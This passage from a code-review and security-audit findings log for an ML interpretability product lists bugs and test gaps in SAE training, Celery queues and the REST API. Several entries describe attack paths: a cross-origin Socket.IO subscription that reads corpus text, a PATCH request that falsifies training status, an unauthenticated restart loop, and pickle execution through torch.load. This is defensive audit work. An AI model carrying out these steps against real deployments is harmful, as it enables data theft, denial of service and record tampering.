- **Proposed remediation:** Either implement the Anthropic rescale as specified in the source paper, or collapse the two and say so.
- **Effort:** M

---

### MIS-E2E-086 — Two SAE training defects: raw-space MSE and a ghost-gradient on the wrong tensor
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/ml/sparse_autoencoder.py:243`, `:262`
- **Claim:**
  1. Reconstruction MSE is computed in **raw** space while sparsity is computed in **normalized** space, so each sample is effectively weighted by `‖x‖²/d`. High-norm tokens dominate the loss, and cross-layer hyperparameter transfer — the stated purpose of normalization — is defeated.
  2. The ghost-gradient (dead-neuron resurrection) penalty encodes **raw `x`** instead of the normalized-and-centered tensor the encoder actually receives, so the resurrection signal is computed on a different input than the one being resurrected against.
- **Failure scenario:** Both silently degrade training quality rather than failing. (1) undermines the reason normalization was introduced; (2) makes dead-neuron recovery less effective in a way no metric surfaces.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-3; `0xcc/docs/SAE-training-optimization-Feb2026.md`
- **Verification (R3):** pending
- **Proposed remediation:** Compute both terms in the same space; encode the same tensor the encoder receives.
- **Effort:** M

---

### MIS-E2E-087 — Layer discovery returns the alphabetically-first norm, discarding the documented preference
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/ml/layer_discovery.py:167` (`_find_matching_attr`)
- **Claim:** `_find_matching_attr` iterates `dir()`, which is **alphabetical**, and so discards the ordering that `LAYER_NORM_PATTERNS` documents as a preference. Reproduced: it returns `input_layernorm` where `_is_transformer_layer` returns `post_attention_layernorm`. Reachable on hybrid models through `get_hookable_module`'s fallback.
- **Failure scenario:** Two functions in the same module disagree about which norm a layer has, and the one that wins is decided by alphabetical order. On a hybrid architecture — the reference model for this product is hybrid — a hook lands on the pre-attention norm instead of the post-attention one. Same family as the hook-target class (MIS-E2E-078), and the same silence.
- **Evidence:** **verified-by-live-repro** (reproduced by the reviewer)
- **Doc reference:** PADR IDL-13 (dynamic layer discovery); memory `probe-the-layer-that-owns-the-thing`
- **Verification (R3):** pending
- **Proposed remediation:** Iterate `LAYER_NORM_PATTERNS` in its declared order and test each against the module, rather than iterating `dir()` and testing membership.
- **Effort:** S

---

### MIS-E2E-088 — Band metrics: a rank-deficient basis inflates FVE, and two controls never run
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/ml/jlens_metrics.py:133`, `:141`, `:240`
- **Claim:** Three defects in the band-report metrics:
  1. **QR of rank-deficient directions pads the basis with arbitrary directions.** Reproduced: four duplicate directions report **FVE 0.378 against a true 0.083** — a 4.5× overstatement of variance explained.
  2. **`excess_fve`, `occupancy` and `next_token_agreement` have no production caller** — so the random-direction control that `control_seed` exists to make reproducible **never runs**.
  3. **`derive_boundaries` claims "first/final *sustained* rise"** and implements first-over-median plus argmax. One noisy layer can set `workspace_start`, including at layer 0, which yields an empty sensory band.
- **Failure scenario:** BR-002 is this product's load-bearing honesty rule — bands render **only** from a measured band report, never from a constant, precisely so no borrowed boundary is presented as measured. These three defects attack the measurement the rule defends: FVE can be overstated 4.5× on a degenerate basis, the control that would show the metric is meaningless is dead code, and the boundary derivation is one noisy layer away from an empty band. A band report can be honest about its provenance and wrong about its content.
- **Evidence:** **verified-by-live-repro** for (1) (reproduced numerically) and (2) (caller inventory); plausible for (3)
- **Doc reference:** BR-002; PADR IDL-40, IDL-44
- **Verification (R3):** pending — the caller inventory for (2) should be re-checked against the band-report service
- **Proposed remediation:** Rank-check before QR and refuse or report a degenerate basis; wire the controls or delete them and stop documenting `control_seed`; implement the sustained-rise criterion the docstring describes.
- **Effort:** M

---

### MIS-E2E-089 — Two candidate findings discarded after verification
- **Phase / Round:** P03 / R1
- **Source:** /code-review high
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/src/ml/sparse_autoencoder.py` (`calibrate_thresholds`); `backend/src/ml/model_loader.py` (`torch_dtype=`)
- **Claim:** **REFUTED, recorded so no later round re-raises them.** (1) `torch.quantile`'s historical 2^24-element limit no longer applies in torch 2.9, so `calibrate_thresholds` is fine at 134M elements. (2) `torch_dtype=` is still back-compatible in transformers 5.15.1 despite the deprecation in favour of `dtype=`. Both were checked by execution against the project venv rather than assumed.
- **Verification (R3):** **REFUTED — no action**
- **Effort:** —

---

## P03 — R2 (mutation controls)

---

### MIS-E2E-090 — BR-002's "anywhere" guard scans two hardcoded modules
- **Phase / Round:** P03 / R2
- **Source:** mutation controls M12 and M13
- **Severity:** P2
- **Type:** test-gap
- **Location:** `backend/tests/unit/test_jlens_band_report.py:236` (`test_no_band_constant_exists_in_the_derivation_module`)
- **Claim:** BR-002 is this product's load-bearing honesty rule, stated as *"no band constant **anywhere**, by construction"* — the published sensory/workspace/motor boundaries were measured on one specific model, so miStudio must draw no bands unless a band report exists for the model in front of you. The guard is an AST walk over `inspect.getsource` of a **hardcoded two-module tuple** (`jlens_metrics`, `jlens_band_report`) rejecting `ast.Constant` values in `(38, 40, 90, 92)`.
- **Failure scenario:** Injecting the literal forbidden constants into `jlens_band_service.py` — a **sibling jlens service in the same package**, and a plausible place for someone to add a default — left the suite green (M13). The rule is package-wide; the check is two-module and maintained by hand. Separately (M12), the scan matches only bare numeric literals, so `4 * 10` evades it — unrealistic as an accident, recorded for completeness.
- **Evidence:** **verified-by-mutation** — both M12 and M13 landed and both left the suite green; M11 (the literal in a scanned module) was killed, which is what makes the scope the variable
- **Doc reference:** BR-002; PADR IDL-40
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Derive the module list rather than hardcoding it — walk every module in the jlens package (and the frontend's band code, which the guard does not cover at all). The precedent already exists in this codebase: the MCP reachability harness is parametrized off the registry rather than a hand-written list, for exactly this reason.
- **Effort:** S

---

### MIS-E2E-091 — The `weights_only` guard against artifact RCE has no test
- **Phase / Round:** P03 / R2
- **Source:** mutation control M14
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/services/jlens_artifact_service.py:396`; also `jlens_acquire_service.py:1086`, `workers/jlens_acquire_tasks.py:185`
- **Claim:** Flipping `weights_only=True` to `False` left **58 jlens tests green**. That flag is the only thing preventing a downloaded J-lens artifact from executing arbitrary pickled code at load time, and the code knows it — `:382` carries the comment *"an artifact is an untrusted file"*.
- **Failure scenario:** A J-lens artifact is acquired from HuggingFace — the product's documented *"acquisition"* path, where the whole point is adopting a lens someone else fitted. With the flag off, `torch.load` on that file executes whatever the publisher pickled, in the GPU worker, which holds `/data` write access and the broker and DB credentials. Nothing in the suite would notice the flag changing, in any of the three load sites.
- **Evidence:** **verified-by-mutation** — M14 landed (confirmed), suite green, restore verified clean
- **Doc reference:** PADR IDL-46 (artifact mount, not upload); BR-031
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** A test that asserts the `weights_only` kwarg passed to `torch.load` is `True` at each of the three sites — cheap, and it is the guard the acquisition feature's entire threat model rests on. Then re-run M14 as a negative control.
- **Effort:** S

---

## P04 — Workers, Celery, task lifecycle

---

### MIS-E2E-092 — Four of five janitors still treat PENDING as alive; the fix exists in one
- **Phase / Round:** P04 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `workers/cleanup_stuck_trainings.py:63`, `cleanup_stuck_extractions.py:80`, `cleanup_stuck_activations.py:61`, `cleanup_stuck_enhanced_labeling.py:50` — against the fixed `cleanup_stuck_circuit_runs.py:84`
- **Claim:** Celery reports `PENDING` for **any task id it holds no result for** — which covers both a queued task and a task whose worker died. `task_track_started` is unset and the long-running tasks never call `update_state`, so a live task and a dead one are indistinguishable. Four janitors treat `PENDING` as alive and therefore **can never fire** for any row that has a `celery_task_id`.
- **The pattern is the finding.** `cleanup_stuck_circuit_runs.py` was written for exactly this trap, uses `looks_abandoned` from `task_heartbeat`, and documents it at `:53` — *"The rule this replaced treated PENDING as alive… Celery reports PENDING for any task id it holds no result for"* — and again at `:63`: *"`looks_abandoned` already solved this for the task-queue surface."* Verified: `looks_abandoned` occurs **once** in `cleanup_stuck_circuit_runs.py` and **zero times** in each of the four siblings. A fix made, documented as general, and applied to one of five.
- **Failure scenario:** Per subsystem: a drained training is never reclaimed; extractions reclaim only the no-task batch-queued rows — *the case the janitor was not written for*; a dead activation extraction never gets `error_type=TIMEOUT` and never emits `extraction:failed`, so the UI spinner never resolves; and enhanced labeling's own error text *"the worker was restarted or the task was lost"* names precisely the state Celery reports as PENDING and the janitor reads as healthy.
- **Evidence:** **verified-by-live-repro** — `looks_abandoned` occurrence counts across all five janitors, and the fixed one's docstring read
- **Doc reference:** PADR IDL-11 (Celery resilience); memory `nlp-status-had-no-janitor`
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Route all four through `looks_abandoned`. Then parametrize the existing regression test over the janitor **registry** rather than naming one — this is the "fixed one representative, never generalized" anti-pattern, and a per-janitor test invites the same omission next time.
- **Effort:** M

---

### MIS-E2E-093 — `train_sae` never reaches the `training` queue, and the guard cannot see it
- **Phase / Round:** P04 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/core/celery_app.py:103` (`"src.workers.training_tasks.*": {"queue": "training"}`); `backend/tests/unit/test_worker_queue_coverage.py`
- **Claim:** Celery's `task_routes` globs match the **registered task name**. Verified against the live router and registry:
  ```
  registered: train_sae, resume_training,
              src.workers.training_tasks.delete_training_files
  route:      train_sae                            -> queue=datasets   (default)
              resume_training                      -> queue=datasets   (default)
              src.workers.training_tasks.delete_training_files -> training
  ```
  `train_sae` and `resume_training` are registered under **short names** and carry no decorator `queue=`, so the `src.workers.training_tasks.*` glob misses them. The `training` queue is declared, provisioned and consumed — and **the primary training task never lands on it**. Only the file-deletion task does.
- **Why the existing guard misses it:** `test_worker_queue_coverage.py` asserts that every queue named in `task_routes` **has a consumer**, that each worker declares its queues, and that `low_priority` is off the GPU worker. It reads the routing *table's values*. It never asks whether any **registered task actually resolves** to a given queue — so a queue that is declared, consumed and permanently empty passes every one of its assertions. The guard proves no queue is a black hole and proves nothing about whether work arrives.
- **Failure scenario:** SAE training — the product's headline long-running GPU job — runs on the `datasets` queue alongside downloads and tokenization, competing for the same workers, while a dedicated `training` worker sits idle. `get_queue_lengths()` reports the training queue empty during a training run, so the Monitor page and any capacity decision built on it are wrong.
- **Evidence:** **verified-by-live-repro** — `celery_app.amqp.router.route()` executed against the real app for each name; registry enumerated
- **Doc reference:** PADR IDL-11; memory `celery-queue-split-and-name-routing` — which records this exact trap
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Add `queue="training"` to both decorators — the pattern `steering_tasks`, `sae_tasks` and `model_tasks` already use correctly. Then extend the guard to assert the **resolved** queue of every registered task, which is the assertion that would have caught this.
- **Effort:** S
- **Note:** the reviewer explicitly cleared `steering.*` and `model_tasks.*` as saved by decorator-level `queue=`, and that clearing is **correct** — confirmed at `steering_tasks.py:115` (`name="steering.compare", queue="steering"`). An initial probe of mine using the *function* name rather than the registered task name suggested otherwise; the probe was wrong, not the code.

---

### MIS-E2E-094 — The solo pool discards `worker_max_tasks_per_child`, so the promised VRAM reclaim never happens
- **Phase / Round:** P04 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/core/celery_app.py:473`
- **Claim:** `worker_max_tasks_per_child` is set with a comment promising a periodic worker restart that reclaims VRAM. Celery's solo pool hardcodes `max-tasks-per-child: None` (`celery/concurrency/solo.py`), so the setting is discarded. `steering_tasks.py:13` already documents this.
- **Failure scenario:** The recycling that would bound cached models, PyTorch hook accumulation and CUDA fragmentation does not occur. This is the documented root cause of the historical steering-worker hang (*"After 5-6 tasks: critical corruption → HANG"*), which was mitigated by an explicit `finally`-block state reset rather than by recycling — so the mitigation is load-bearing and the setting beside it is decorative. The comment tells the next reader the opposite.
- **Evidence:** verified-by-live-repro (Celery source inspected; the contradicting comment at `steering_tasks.py:13` read)
- **Doc reference:** PADR IDL-11; `.claude/context/agents/qa_engineer.md` records the original hang analysis
- **Verification (R3):** pending
- **Proposed remediation:** Delete the setting and the comment, or move off the solo pool deliberately. A configuration line that does nothing, next to a comment saying it does something, is worse than neither.
- **Effort:** S

---

### MIS-E2E-095 — No beat entry sets `expires`, so stale periodic tasks queue up behind long jobs
- **Phase / Round:** P04 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/core/celery_app.py:453` (the beat schedule)
- **Claim:** No entry in the beat schedule sets `expires`. `low_priority` is served by **one solo worker** that also runs NLP passes taking ~13 minutes.
- **Failure scenario:** During a single NLP pass, roughly **26 stale 30-second reconciles** and **13 watchdog runs** accumulate and then drain serially behind it, each doing work whose window has long passed. A reconcile that ran 13 minutes late can act on state that has since changed. `expires` exists precisely so a periodic task that missed its slot is dropped rather than queued.
- **Evidence:** plausible (read-only) — the absent `expires` and the interval arithmetic are verified; the pile-up is reasoned
- **Doc reference:** PADR IDL-5 (Celery Beat for system monitoring)
- **Verification (R3):** pending
- **Proposed remediation:** Set `expires` on every periodic entry to slightly under its interval.
- **Effort:** S

---

### MIS-E2E-096 — A liveness stamp is wiped mid-task, and a diagnostic is overwritten before it is read
- **Phase / Round:** P04 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/workers/jlens_fit_tasks.py:229` and `:180`; `backend/src/workers/cleanup_stuck_enhanced_labeling.py:69`
- **Claim:** Two independent defects:
  1. **`update_state` without `beat()`** during the `validating` stage of a J-lens fit **wipes the liveness stamp** the heartbeat mechanism relies on. A death during validation is then undetectable until `result_expires` (~1 hour) instead of the intended 10 minutes — on a task that holds the single-GPU guard.
  2. **`job.status` is overwritten with `FAILED` before it is interpolated** into the message, so every enhanced-labeling janitor message reads *"Job stuck in **failed** for N minutes"* — losing the QUEUED-vs-RUNNING distinction, which is the only diagnostic that says whether the job ever started.
- **Failure scenario:** (1) is the sharper one: it is a regression *within* the heartbeat mechanism that exists to bound exactly this, and it strands the GPU. (2) destroys the one piece of information the message exists to carry.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-11
- **Verification (R3):** pending
- **Proposed remediation:** Call `beat()` alongside `update_state`; capture the status before mutating it.
- **Effort:** S

---

### MIS-E2E-097 — No test asserts any task's resolved queue
- **Phase / Round:** P04 / R2
- **Source:** mutation control M17
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/tests/unit/test_worker_queue_coverage.py`
- **Claim:** Removing `queue="steering"` from `steering.compare` — the GPU steering task — left **184 tests green**, including every test in the file written to guard queue routing.
- **Failure scenario:** `test_worker_queue_coverage.py` asserts that every queue named in `task_routes` has a consumer, that each worker declares its queues explicitly, and that `low_priority` is off the GPU worker. Every one of those reads the routing **table**. None asserts that a **registered task** resolves to the queue intended for it. So a queue may be declared, provisioned, consumed and permanently empty and the suite is green — which is the live state of the `training` queue (MIS-E2E-093). The guard's own docstring lists its negative controls as *"route a task to a queue no container lists → coverage test fails"*; the inverse case, a task that reaches no dedicated queue at all, is not among them.
- **Evidence:** **verified-by-mutation** — M17 landed (confirmed), suite green, restore verified clean
- **Doc reference:** PADR IDL-11; memory `celery-queue-split-and-name-routing`
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Add one assertion driven off the registry: for every registered task, resolve its queue through `celery_app.amqp.router` and compare against an expected mapping. That single test catches MIS-E2E-093 and would have caught M17. It is the same derive-from-the-registry shape the MCP reachability harness already uses.
- **Effort:** S

---

## P05 — REST API surface & schemas

---

### MIS-E2E-098 — Retry erases the failure evidence, then refuses, stranding the row forever
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/task_queue.py:852` (the `increment_retry_count` call), `:908-912` (the 400 fallthrough); `backend/src/services/task_queue_service.py:285-292`
- **Claim:** `retry_task` calls `TaskQueueService.increment_retry_count` **before** the dispatch `if/elif` chain. That helper is not a counter increment — it sets `status="queued"`, `error_message=None`, `progress=0.0`, `completed_at=None`, `started_at=None` and then **`await db.commit()`**. If the task's `(task_type, entity_type)` pair matches no branch, execution reaches the `else` at `:908` and raises `HTTPException(400, "Unsupported task type…")`.
- **Failure scenario:** The row is committed as `queued` with its error message destroyed, **no Celery task dispatched**, and the caller gets a 400. That row is now permanently stuck: it no longer appears under `/failed` because its status is not failed, nothing will ever process it because nothing was queued, and pressing Retry again repeats the sequence. The one artifact that said *why* the job failed is gone on the first click, irrecoverably — and the click that destroyed it also returned an error, so the user has no reason to think anything was written at all.
- **Evidence:** **verified-by-live-repro at source** — the call ordering, the helper's field resets and its `db.commit()`, and the 400 fallthrough all read directly
- **Doc reference:** PADR IDL-11; `.claude/context/agents/qa_engineer.md` records the sibling "task_queue retry ghosts" defect
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Resolve the dispatch branch **first**, then increment. Better: make `increment_retry_count` take the new `task_id` so the reset and the dispatch commit together, and neither can happen without the other.
- **Effort:** S

---

### MIS-E2E-099 — `POST /system/restart` is an unauthenticated, idempotent restart loop
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/system.py:56-70`
- **Claim:** The handler takes no arguments, requires nothing, schedules `_delayed_exit` as a FastAPI background task and returns `200 {"status": "restarting"}`. Its docstring notes *"Docker will automatically restart the container due to the restart policy"* — so the restart policy is what makes it repeatable.
- **Failure scenario:** Same privilege class as the steering `pkill`/`Popen` pair already recorded as MIS-E2E-003, and not covered by the accepted network-boundary posture for the same reason: terminating the API process is a privilege operation regardless of who can reach the port. Because it is unauthenticated, unrated and idempotent, a caller that repeats it keeps the backend permanently unavailable — the restart policy that makes the feature work is what makes the loop self-sustaining. It also kills any in-flight request, including a training dispatch mid-write.
- **Evidence:** **verified-by-live-repro at source** — the whole handler read; no auth dependency, no confirmation token, no rate limit
- **Doc reference:** none; MIS-E2E-002 records the posture, and this is one of the operations that escapes it
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Require the same `X-Internal-Token` HMAC the two `/api/internal/` routes use — that mechanism already exists in this codebase and is correctly built (`main.py:142`, `compare_digest`, always 403). Nginx already `deny all`s `/api/internal/`; this route deserves the same treatment.
- **Effort:** S

---

### MIS-E2E-100 — Features from downloaded SAEs lose their labels in the Steering browser
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/saes.py:420` (`browse_sae_features`)
- **Claim:** The handler resolves features only through `sae.training_id`. A **downloaded or externally imported** SAE has `external_sae_id` set and `training_id` NULL, so its features never match and the handler falls through to a placeholder branch.
- **Failure scenario:** Every feature of an external SAE renders in the Steering browser with no label, no activation statistics, no `activation_frequency` and no `feature_id`. The missing `activation_frequency` is the sharper half: the frequency-derived auto-baseline (`S = clamp(2.9 − 2.6·freq, 1, 3)`, PADR IDL-27) has nothing to compute from, so every such feature silently falls back to the default strength of 10 — and downloading a community SAE from HuggingFace is a first-class, documented workflow.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-27; PPRD §3.5, §3.12; memory `steering-011-baseline-and-color-literal`
- **Verification (R3):** pending — an external SAE exists in this deployment; a live `GET /saes/{id}/features` would settle it
- **Proposed remediation:** Resolve on `external_sae_id` as well — the `Feature` model carries both columns and the extraction path already writes whichever applies.
- **Effort:** S

---

### MIS-E2E-101 — A failed activation extraction disappears from the Monitor entirely
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/task_queue.py:495` (`/failed`) versus `:671` (`/active`)
- **Claim:** `/active` federates over `activation_extractions`; `/failed` does not. And the activation worker writes no `task_queue` failure row — `task_queue` rows are created only in the failure handlers of three other task types.
- **Failure scenario:** A failed "Extract Activations" job is visible in neither surface: not in `/active` (it is no longer active) and not in `/failed` (no federator, no row). It vanishes. The Monitor page is the product's single answer to "what went wrong", and this job type is absent from it — the same class the architect persona recorded as *"task_queue has no lifecycle owner"*, still open on this branch of it.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-11; `.claude/context/sessions/review_celery_monitor_operations_2026-07-10.md`
- **Verification (R3):** pending
- **Proposed remediation:** Add the federator to `/failed`, mirroring `/active`. The recorded architectural decision from that earlier review — *federate read-only over the real job tables rather than dual-writing `task_queue`* — already prescribes this; it was applied to `/active` only.
- **Effort:** S

---

### MIS-E2E-102 — Blocking Redis reads inside the async Monitor handler
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** perf
- **Location:** `backend/src/api/v1/endpoints/task_queue.py:701` (`_celery_view`)
- **Claim:** `_celery_view` performs **synchronous** Redis result-backend reads — three per row — inside the `async def` `/active` handler. Synchronous I/O in a coroutine blocks the event loop for its duration.
- **Failure scenario:** The Monitor page polls `/active` continuously. Every poll blocks the single event loop for three synchronous Redis round-trips per active task, stalling **every other request** the API is serving — including WebSocket emissions and training dispatch. The cost scales with the number of active tasks, so it is worst exactly when the Monitor is most needed.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-1 (WebSocket-first realtime)
- **Verification (R3):** pending — measurable against the live app
- **Proposed remediation:** `run_in_threadpool`, or an async Redis client. Per the standing rule, benchmark `/active` specifically — a fix measured against a different endpoint is not a verified fix.
- **Effort:** S

---

### MIS-E2E-103 — Two error-path defects: an unreachable 409 and a 400 re-raised as a 500
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/features.py:134`; `backend/src/api/v1/endpoints/saes.py:218`
- **Claim:**
  1. **The documented 409 is unreachable on the large-delete path.** For an extraction with >5000 features, the handler queues the background task with **no existence or active-job check** and returns 202. The 409 the API documents for a conflicting delete can only fire on the small path. The worker's own guard then refuses the job silently, so the caller is told 202 and nothing happens.
  2. **A deliberate 400 is swallowed into a 500.** `HTTPException(400, "SAE files not found…")` is raised **inside** a `try` whose bare `except Exception` catches it and re-raises as a 500, with the original status stringified into the detail. The client gets a server error for a client mistake, and the real message is buried in a nested string.
- **Failure scenario:** (1) means the size of an extraction silently changes the API's contract; (2) is the stack-trace/status-leak class that PADR IDL-22 exists to prevent, reintroduced by an over-broad `except`.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-22; the project's `{data, meta}` / `{error}` API convention
- **Verification (R3):** pending
- **Proposed remediation:** Move the existence/active check above the size branch; re-raise `HTTPException` before the generic handler (`except HTTPException: raise`).
- **Effort:** S

---

### MIS-E2E-104 — A training is dispatched before its Celery id is persisted
- **Phase / Round:** P05 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/trainings.py:56`
- **Claim:** `train_sae_task.delay()` fires **before** `celery_task_id` is written to the row. If the request fails in that window, the task is running with nothing recording its id.
- **Failure scenario:** The run cannot be revoked — `POST /trainings/{id}/control`'s stop path resolves the Celery task through `celery_task_id`, which is NULL. A GPU training runs to completion with no way to stop it from the product, and the janitor cannot reclaim it either (MIS-E2E-092 makes that worse: with no task id the row is reclaimable, with one it is not, so this bug is the *lucky* case).
- **Evidence:** plausible (read-only) — flagged as PLAUSIBLE by the reviewer and left there; the window is narrow
- **Doc reference:** PADR IDL-11
- **Verification (R3):** pending
- **Proposed remediation:** Persist a row first, dispatch, then write the id — or use a pre-generated `task_id` passed to `apply_async` so the id exists before dispatch.
- **Effort:** S

---

### MIS-E2E-105 — Socket.IO accepts any origin with no auth and joins any channel on request
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/core/websocket.py:19` (`cors_allowed_origins="*"`), `:88-113` (`subscribe`); `backend/src/main.py:94` (`connect`), `:104-109` (the `subscribe` event)
- **Claim:** Three controls are absent at once, and the reason is a comment that is false:
  ```python
  # NOTE: CORS is handled by FastAPI's CORSMiddleware in main.py
  # Setting cors_allowed_origins="*" here prevents duplicate CORS headers
  sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*", ...)
  ```
  `main.py:85-86` says the **opposite** and installs no `CORSMiddleware` at all. Nginx's `/ws/` block only `add_header`s, which sets a response header and blocks nothing. Origin enforcement for a WebSocket upgrade is server-side and nothing else can do it — and engineio short-circuits the check entirely on `"*"` (`base_server.py:301`: `elif self.cors_allowed_origins == '*': allowed_origins = None`), with its own source comment noting this matters *more* for WebSocket because browsers do not apply CORS controls to it. Downstream, `connect` only logs, and `subscribe` joins the caller to **any string supplied**, with no ownership, existence or format check.
- **Failure scenario:** **This escapes the accepted posture.** MIS-E2E-002 concedes "anyone who can reach the host can read the API." This converts it to "**any website an operator visits** can reach the host" — a boundary crossing the posture does not grant. A page in the operator's browser opens `io('http://mistudio.hitsai.local/ws', {path:'/ws/socket.io'})` and emits `subscribe` for any channel. `labeling/{job_id}/results` carries verbatim corpus text — `prefix_tokens`, `prime_token`, `suffix_tokens` per activation example (`websocket_emitter.py:888-937`); `steering/{task_id}` carries generated model output (`:1290-1340`); `system/*` channels need no id at all and can simply be guessed.
- **Evidence:** **verified-by-live-repro at source** — the wildcard, the false comment, `main.py`'s contradicting statement, the unvalidated `subscribe`, and the engineio short-circuit all read directly
- **Doc reference:** PADR IDL-1, IDL-12; **MIS-E2E-018** recorded this same false comment as a P3 doc-drift finding — this is its consequence, and it makes 018 load-bearing rather than cosmetic
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Set `cors_allowed_origins` to `settings.allowed_origins` (already defined at `config.py:63`), delete the false comment, and validate `subscribe` against a known channel-pattern allowlist. Add a test that connects with `Origin: https://evil.example` and asserts refusal, then flip the setting back as a negative control.
- **Effort:** M
- **Note:** this repo's history already includes a WebSocket broadcast leaking user prompt text, found by mutation after a round recorded "Privacy holds". The channels here carry the same class of content and the transport now has no origin control.

---

### MIS-E2E-106 — `PATCH` lets a caller set lifecycle status and falsify training metrics
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/schemas/training.py:272-281` (`TrainingUpdate`), sink `backend/src/services/training_service.py:276-281`; same shape at `schemas/model.py:34` → `model_service.py:207-210` and `schemas/dataset.py:42` → `dataset_service.py:227-248`
- **Claim:** Three `*Update` schemas expose the row's **lifecycle `status`** and are blind-`setattr`'d onto the ORM. `TrainingUpdate` additionally exposes `progress`, `current_step`, `current_loss`, `current_l0_sparsity`, `current_dead_neurons`, `current_learning_rate`, `error_message` and `error_traceback` — every field the worker owns. The sink is a bare loop over `model_dump(exclude_unset=True)` with a single special case to unwrap the enum.
- **Failure scenario:** `PATCH /api/trainings/{id} {"status": "completed"}` against a running job does three things at once. (1) **Unlocks SAE import from a partial checkpoint** — `sae_manager_service.py:225` and `:457` gate solely on `status != COMPLETED`, so SAEs are built from whatever step the run reached and imported as finished artifacts, with **no `finalized_from_step` marker**, which is the one signal Feature 21 added to distinguish a salvaged run from a complete one. (2) **Makes the job uncancellable** — `training_service.py:558` returns `None` for any terminal status, so `cancel_training` silently no-ops while the worker keeps the GPU. (3) **Falsifies the record** — `progress: 100`, `current_loss: 0.01`, `current_dead_neurons: 0` are writable in the same request. The same shape on `PATCH /models/{id} {"status":"ready"}` defeats the in-flight guards at `models.py:140` and `:388`.
- **Evidence:** **verified-by-live-repro at source** — the schema fields and the `setattr` loop read directly; the reviewer separately confirmed the SQLEnum bind processor persists a raw `"ready"` string, so there is no type error to stop it
- **Doc reference:** PADR IDL-39 (finalize-from-checkpoint, honest `finalized_from_step`); PPRD row 21
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Remove `status` and the derived progress/metric fields from all three `*Update` schemas — they are worker-owned. Replace the blind loops with explicit allowlists; `cluster_profile_service.py:272-293` and `circuit_service.py:288-296` are the correct in-repo reference implementations.
- **Effort:** M
- **Related:** MIS-E2E-071 (the same blind-`setattr` sink, different fields)

---

### MIS-E2E-107 — A plain `alias` renames on output, corrupting dataset metadata and stranding task ids
- **Phase / Round:** P05 / R1
- **Source:** /security-review
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/schemas/metadata.py:238` (`alias="schema"`); `backend/src/schemas/dataset.py:56-95`; `backend/src/services/dataset_service.py:227`
- **Claim:** `DatasetMetadata.dataset_schema` uses a **plain `alias`**, the exact construct that `schemas/jspace_contracts.py:11-14` and `schemas/cluster_profile.py:166-175` both warn about in writing — *"a plain `alias` also renames the field on SERIALISATION, which republished the schema with `sae_id` and NO `mistudio_sae_id`"*. The lesson was written down and never applied outside those two modules; the guard enforcing it (`test_jspace_contracts.py:97`) iterates only `JSPACE_KINDS`. Reproduced end to end against pydantic 2.12.5:
  ```
  input  : {schema, split, config, hf_access_token_used, task_id, task_type, lock_key}
  persist: {schema, split, task_id(STALE), task_type(STALE), dataset_schema(DUPLICATE)}
    config / hf_access_token_used / lock_key survived? False
    duplicate 'dataset_schema' key added?           True
  ```
  Two defects compound: the rename on output adds a duplicate key, and `extra="ignore"` on a model declaring only three fields **destroys every other top-level key**.
- **Failure scenario:** Worse internally than externally. `datasets.py:596-601` writes `task_id`, `task_type` and `lock_key` through `DatasetUpdate` — and once a dataset's metadata contains a `schema` block, all three writes are discarded. `GET /datasets/{id}/task-status` then reads the **stale** `task_id` and reports a previous task's state; `POST /datasets/{id}/cancel` **revokes the wrong Celery task**. Nothing raises.
- **The test pins the defect.** `test_tokenization_metadata.py:152-153` reads `# Note: Pydantic validation transforms "schema" to "dataset_schema" due to alias` and asserts `"dataset_schema" in retrieved.extra_metadata`. Thirteen assertions encode the renamed key, so the suite is permanently green over it — a test written to describe the bug rather than prevent it.
